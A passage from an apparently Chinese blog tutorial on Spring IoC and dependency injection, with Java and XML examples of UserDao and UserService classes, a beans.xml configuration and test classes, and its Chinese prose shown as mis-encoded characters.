class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">UserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é»˜è®¤è·å–ç”¨æˆ·çš„æ•°æ®&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoMysqlImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;mysql è·å–ç”¨æˆ·çš„æ•°æ®&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserService ä¸šåŠ¡æ¥å£</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserServicelmpl ä¸šåŠ¡å®ç°ç±»</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">import</span> com.kuang.dao.UserDao;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoImpl;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoMysqlImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-comment">//è¿™æ ·çš„ä»£ç ï¼Œç”¨æˆ·çš„éœ€æ±‚å¯èƒ½ä¼šå½±å“æˆ‘ä»¬åŸæ¥çš„ä»£ç ï¼Œæˆ‘ä»¬éœ€æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚å»ä¿®æ”¹åŸä»£ç ï¼</span><br>    <span class="hljs-comment">//private UserDao userDao = new UserDaoImpl();</span><br>    <span class="hljs-comment">//private UserDao userDao = new UserDaoMysqlImpl();</span><br><br>    <span class="hljs-comment">//ä½¿ç”¨ Set æ¥å£ï¼Œé¿å…äº†æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚å»ä¿®æ”¹åŸä»£ç ï¼Œè€Œæ˜¯ç”±ç”¨æˆ·å†³å®šéœ€è¦è°ƒç”¨å“ªä¸ªæ¥å£ã€‚ä¹‹å‰ï¼Œç¨‹åºæ˜¯ä¸»åŠ¨åˆ›å»ºå¯¹è±¡ï¼Œæ§åˆ¶æƒåœ¨ç¨‹åºçŒ¿æ‰‹ä¸Šï¼›ä½¿ç”¨ setæ³¨å…¥åï¼Œç¨‹åºä¸å†å…·æœ‰ä¸»åŠ¨æ€§ï¼Œè€Œæ˜¯å˜æˆäº†è¢«åŠ¨çš„æ¥æ”¶å¯¹è±¡</span><br>    <span class="hljs-comment">// è¿™ç§ â€œæ§åˆ¶åè½¬â€ çš„æ€æƒ³ï¼Œä»æœ¬è´¨ä¸Šè§£å†³äº†ç¨‹åºçŒ¿ç®¡ç†å¯¹è±¡çš„åˆ›å»ºçš„é—®é¢˜ï¼Œç³»ç»Ÿçš„è€¦åˆæ€§å¤§å¤§é™ä½ï¼Œä»è€Œæ›´ä¸“æ³¨äºä¸šåŠ¡çš„å®ç°ä¸Šï¼</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br>    <span class="hljs-comment">//åˆ©ç”¨ set è¿›è¡ŒåŠ¨æ€å®ç°å€¼çš„æ³¨å…¥</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserDao</span><span class="hljs-params">(UserDao userDao)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userDao = userDao;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        userDao.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>MyTest ç”¨æˆ·å±‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoImpl;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoMysqlImpl;<br><span class="hljs-keyword">import</span> com.kuang.service.UserService;<br><span class="hljs-keyword">import</span> com.kuang.service.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼Œdao å±‚ä»–ä»¬ä¸éœ€è¦æ¥è§¦</span><br>        <span class="hljs-comment">//ä¹‹å‰ï¼Œç”¨æˆ·è°ƒç”¨ä»€ä¹ˆæ¥å£ï¼Œæ˜¯ç”± UserServicelmpl ä¸­å†™æ­»çš„ï¼Œ</span><br>        <span class="hljs-comment">// UserService userService  = new UserServiceImpl();</span><br>        <span class="hljs-comment">// userService.getUser();</span><br><br>        <span class="hljs-comment">//è€ŒåŠ å…¥â€œæ§åˆ¶åè½¬â€ çš„æ€æƒ³åï¼Œä¸»åŠ¨æƒäº¤ç”±ç”¨æˆ·æ‰‹ä¸­</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        ((UserServiceImpl) userService).setUserDao(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoImpl</span>());<br>        userService.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749159.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311751713.png" alt="img"></p><p>ä½¿ç”¨ Set æ¥å£ï¼Œé¿å…äº†æ ¹æ®ç”¨æˆ·çš„éœ€æ±‚å»ä¿®æ”¹åŸä»£ç ï¼Œè€Œæ˜¯ç”±ç”¨æˆ·å†³å®šéœ€è¦è°ƒç”¨å“ªä¸ªæ¥å£ã€‚ä¹‹å‰ï¼Œç¨‹åºæ˜¯ä¸»åŠ¨åˆ›å»ºå¯¹è±¡ï¼Œæ§åˆ¶æƒåœ¨ç¨‹åºçŒ¿æ‰‹ä¸Šï¼›ä½¿ç”¨ setæ³¨å…¥åï¼Œç¨‹åºä¸å†å…·æœ‰ä¸»åŠ¨æ€§ï¼Œè€Œæ˜¯å˜æˆäº†è¢«åŠ¨çš„æ¥æ”¶å¯¹è±¡</p><p>è¿™ç§ â€œæ§åˆ¶åè½¬â€ çš„æ€æƒ³ï¼Œä»æœ¬è´¨ä¸Šè§£å†³äº†ç¨‹åºçŒ¿ç®¡ç†å¯¹è±¡çš„åˆ›å»ºçš„é—®é¢˜ï¼Œç³»ç»Ÿçš„è€¦åˆæ€§å¤§å¤§é™ä½ï¼Œä»è€Œæ›´ä¸“æ³¨äºä¸šåŠ¡çš„å®ç°ä¸Šï¼</p><h2 id="2-2-IOC-æœ¬è´¨"><a href="#2-2-IOC-æœ¬è´¨" class="headerlink" title="2.2 IOC æœ¬è´¨"></a>2.2 IOC æœ¬è´¨</h2><p><strong>æ§åˆ¶åè½¬IoC(Inversion of Control)ï¼Œæ˜¯ä¸€ç§è®¾è®¡æ€æƒ³ï¼ŒDI(ä¾èµ–æ³¨å…¥)æ˜¯å®ç°IoCçš„ä¸€ç§æ–¹æ³•</strong>ï¼Œä¹Ÿæœ‰äººè®¤ä¸ºDIåªæ˜¯IoCçš„å¦ä¸€ç§è¯´æ³•ã€‚æ²¡æœ‰IoCçš„ç¨‹åºä¸­ , æˆ‘ä»¬ä½¿ç”¨é¢å‘å¯¹è±¡ç¼–ç¨‹ , å¯¹è±¡çš„åˆ›å»ºä¸å¯¹è±¡é—´çš„ä¾èµ–å…³ç³»å®Œå…¨ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯¹è±¡çš„åˆ›å»ºç”±ç¨‹åºè‡ªå·±æ§åˆ¶ï¼Œæ§åˆ¶åè½¬åå°†å¯¹è±¡çš„åˆ›å»ºè½¬ç§»ç»™ç¬¬ä¸‰æ–¹ï¼Œä¸ªäººè®¤ä¸ºæ‰€è°“æ§åˆ¶åè½¬å°±æ˜¯ï¼šè·å¾—ä¾èµ–å¯¹è±¡çš„æ–¹å¼åè½¬äº†ã€‚</p><p><strong>IoCæ˜¯Springæ¡†æ¶çš„æ ¸å¿ƒå†…å®¹</strong>ï¼Œä½¿ç”¨å¤šç§æ–¹å¼å®Œç¾çš„å®ç°äº†IoCï¼Œå¯ä»¥ä½¿ç”¨XMLé…ç½®ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ³¨è§£ï¼Œæ–°ç‰ˆæœ¬çš„Springä¹Ÿå¯ä»¥é›¶é…ç½®å®ç°IoCã€‚</p><p>Springå®¹å™¨åœ¨åˆå§‹åŒ–æ—¶å…ˆè¯»å–é…ç½®æ–‡ä»¶ï¼Œæ ¹æ®é…ç½®æ–‡ä»¶æˆ–å…ƒæ•°æ®åˆ›å»ºä¸ç»„ç»‡å¯¹è±¡å­˜å…¥å®¹å™¨ä¸­ï¼Œç¨‹åºä½¿ç”¨æ—¶å†ä»Iocå®¹å™¨ä¸­å–å‡ºéœ€è¦çš„å¯¹è±¡ã€‚</p><p> é‡‡ç”¨XMLæ–¹å¼é…ç½®Beançš„æ—¶å€™ï¼ŒBeançš„å®šä¹‰ä¿¡æ¯æ˜¯å’Œå®ç°åˆ†ç¦»çš„ï¼Œè€Œé‡‡ç”¨æ³¨è§£çš„æ–¹å¼å¯ä»¥æŠŠä¸¤è€…åˆä¸ºä¸€ä½“ï¼ŒBeançš„å®šä¹‰ä¿¡æ¯ç›´æ¥ä»¥æ³¨è§£çš„å½¢å¼å®šä¹‰åœ¨å®ç°ç±»ä¸­ï¼Œä»è€Œè¾¾åˆ°äº†é›¶é…ç½®çš„ç›®çš„ã€‚</p><p><strong>æ§åˆ¶åè½¬æ˜¯ä¸€ç§é€šè¿‡æè¿°ï¼ˆXMLæˆ–æ³¨è§£ï¼‰å¹¶é€šè¿‡ç¬¬ä¸‰æ–¹å»ç”Ÿäº§æˆ–è·å–ç‰¹å®šå¯¹è±¡çš„æ–¹å¼ã€‚åœ¨Springä¸­å®ç°æ§åˆ¶åè½¬çš„æ˜¯IoCå®¹å™¨ï¼Œå…¶å®ç°æ–¹æ³•æ˜¯ä¾èµ–æ³¨å…¥ï¼ˆDependency Injection,DIï¼‰ã€‚</strong></p><h2 id="2-3-HelloSpring"><a href="#2-3-HelloSpring" class="headerlink" title="2.3 HelloSpring"></a>2.3 HelloSpring</h2><h3 id="æ¡ˆä¾‹äºŒ"><a href="#æ¡ˆä¾‹äºŒ" class="headerlink" title="æ¡ˆä¾‹äºŒ"></a>æ¡ˆä¾‹äºŒ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">private</span> String str;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStr</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStr</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-built_in">this</span>.str = str;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;str=&#x27;&quot;</span> + str + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!--    ä½¿ç”¨ Spring æ¥åˆ›å»ºå¯¹è±¡ï¼Œåœ¨ Spring è¿™äº›éƒ½ç§°ä¸º Bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Hello&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;str&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Spring&quot;</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.kuang.pojo.Hello;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//è·å– Spring çš„ä¸Šä¸‹æ–‡å¯¹è±¡,.è§£æbeans.xmlæ–‡ä»¶ , ç”Ÿæˆç®¡ç†ç›¸åº”çš„Beanå¯¹è±¡</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-comment">//getBean å‚æ•°å³ä¸ºspringé…ç½®æ–‡ä»¶ä¸­beançš„id</span><br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Hello) context.getBean(<span class="hljs-string">&quot;hello&quot;</span>);<br>        System.out.println(hello.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>hello å¯¹è±¡æ˜¯ç”±Springåˆ›å»ºçš„</li><li>hello å¯¹è±¡çš„å±æ€§æ˜¯ç”±Springå®¹å™¨è®¾ç½®çš„</li></ul><p>è¿™ä¸ªè¿‡ç¨‹å°±å«æ§åˆ¶åè½¬ï¼š</p><ul><li>æ§åˆ¶ : è°æ¥æ§åˆ¶å¯¹è±¡çš„åˆ›å»º , ä¼ ç»Ÿåº”ç”¨ç¨‹åºçš„å¯¹è±¡æ˜¯ç”±ç¨‹åºæœ¬èº«æ§åˆ¶åˆ›å»ºçš„ , ä½¿ç”¨Springå , å¯¹è±¡æ˜¯ç”±Springæ¥åˆ›å»ºçš„</li><li>åè½¬ : ç¨‹åºæœ¬èº«ä¸åˆ›å»ºå¯¹è±¡ , è€Œå˜æˆè¢«åŠ¨çš„æ¥æ”¶å¯¹è±¡ .</li></ul><p>ä¾èµ–æ³¨å…¥ : å°±æ˜¯åˆ©ç”¨setæ–¹æ³•æ¥è¿›è¡Œæ³¨å…¥çš„.</p><p>IOCæ˜¯ä¸€ç§ç¼–ç¨‹æ€æƒ³ï¼Œç”±ä¸»åŠ¨çš„ç¼–ç¨‹å˜æˆè¢«åŠ¨çš„æ¥æ”¶</p><p>å¯ä»¥é€šè¿‡newClassPathXmlApplicationContextå»æµè§ˆä¸€ä¸‹åº•å±‚æºç  .</p><h3 id="æ¡ˆä¾‹ä¸€ä¿®æ”¹"><a href="#æ¡ˆä¾‹ä¸€ä¿®æ”¹" class="headerlink" title="æ¡ˆä¾‹ä¸€ä¿®æ”¹"></a>æ¡ˆä¾‹ä¸€ä¿®æ”¹</h3><p>æ–°å¢ beans.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:util</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/util&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/util https://www.springframework.org/schema/util/spring-util.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mysqlImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.dao.UserDaoMysqlImpl&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;oracleImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.dao.UserDaoOracleImpl&quot;</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;UserServiceImpl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.service.UserServiceImpl&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    ref : å¼•ç”¨ Spring å®¹å™¨ä¸­åˆ›å»ºå¥½çš„å¯¹è±¡</span><br><span class="hljs-comment">    value : å…·ä½“çš„å€¼ï¼ŒåŸºæœ¬æ•°æ®ç±»å‹</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userDao&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;mysqlImpl&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ MyTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//import com.kuang.dao.UserDaoImpl;</span><br><span class="hljs-comment">//import com.kuang.dao.UserDaoMysqlImpl;</span><br><span class="hljs-comment">//import com.kuang.service.UserService;</span><br><span class="hljs-comment">//import com.kuang.service.UserServiceImpl;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//public class MyTest &#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//    public static void main(String[] args) &#123;</span><br><span class="hljs-comment">//        //ç”¨æˆ·å®é™…è°ƒç”¨çš„æ˜¯ä¸šåŠ¡å±‚ï¼Œdao å±‚ä»–ä»¬ä¸éœ€è¦æ¥è§¦</span><br><span class="hljs-comment">//        //ä¹‹å‰ï¼Œç”¨æˆ·è°ƒç”¨ä»€ä¹ˆæ¥å£ï¼Œæ˜¯ç”± UserServicelmpl ä¸­å†™æ­»çš„ï¼Œ</span><br><span class="hljs-comment">//        // UserService userService  = new UserServiceImpl();</span><br><span class="hljs-comment">//        // userService.getUser();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        //è€ŒåŠ å…¥â€œæ§åˆ¶åè½¬â€ çš„æ€æƒ³åï¼Œä¸»åŠ¨æƒäº¤ç”±ç”¨æˆ·æ‰‹ä¸­</span><br><span class="hljs-comment">//        UserService userService  = new UserServiceImpl();</span><br><span class="hljs-comment">//        ((UserServiceImpl) userService).setUserDao(new UserDaoMysqlImpl());</span><br><span class="hljs-comment">//        userService.getUser();</span><br><span class="hljs-comment">//    &#125;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-keyword">import</span> com.kuang.service.UserServiceImpl;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//è·å– ApplicationContext;æ‹¿åˆ° Spring çš„å®¹å™¨</span><br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXmlApplicationContext</span>(<span class="hljs-string">&quot;beans.xml&quot;</span>);<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userServiceImpl</span> <span class="hljs-operator">=</span> (UserServiceImpl) context.getBean(<span class="hljs-string">&quot;UserServiceImpl&quot;</span>);<br>        userServiceImpl.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å‘¢ï¼Œæ¡ˆä¾‹ä¸€æƒ³å®ç°äº†ä¸éœ€è¦ç¨‹åºçŒ¿æˆ–è€…ç”¨æˆ·æ”¹åŠ¨ä»£ç å®ç°ä¸åŒçš„æ“ä½œï¼Œåªéœ€è¦åœ¨xmlé…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹ï¼Œå³å¯è¾¾åˆ°ç›®çš„ã€‚</p><p>æ‰€è°“çš„IoC,ä¸€å¥è¯æå®š : å¯¹è±¡ç”±Spring æ¥åˆ›å»º , ç®¡ç† , è£…é… ! </p><h2 id="2-4-IOC-åˆ›å»ºå¯¹è±¡æ–¹å¼"><a href="#2-4-IOC-åˆ›å»ºå¯¹è±¡æ–¹å¼" class="headerlink" title="2.4 IOC åˆ›å»ºå¯¹è±¡æ–¹å¼"></a>2.4 IOC åˆ›å»ºå¯¹è±¡æ–¹å¼</h2><h3 id="2-4-1-æ— å‚æ„é€ "><a href="#2-4-1-æ— å‚æ„é€ " class="headerlink" title="2.4.1 æ— å‚æ„é€ "></a>2.4.1 æ— å‚æ„é€ </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;User çš„æ— å‚æ„é€ &quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title 